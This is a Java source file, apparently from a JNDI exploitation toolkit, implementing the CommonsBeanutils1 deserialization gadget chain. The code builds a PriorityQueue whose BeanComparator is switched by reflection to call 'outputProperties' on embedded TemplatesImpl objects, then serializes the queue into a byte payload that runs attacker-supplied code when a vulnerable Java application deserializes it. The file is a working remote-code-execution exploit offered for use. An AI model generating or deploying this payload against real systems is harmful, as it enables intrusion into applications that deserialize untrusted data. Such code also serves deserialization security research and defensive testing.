package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.utils.MyURLClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils1 implements ObjectPayload<Object> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, param);
        // mock method name until armed
        MyURLClassLoader classLoader = new MyURLClassLoader("commons-beanutils-1.9.2.jar");
        Class            clazz       = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Object           comparator  = clazz.getDeclaredConstructor(new Class[]{String.class}).newInstance(new Object[]{"lowestSetBit"});


        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;


        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(queue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
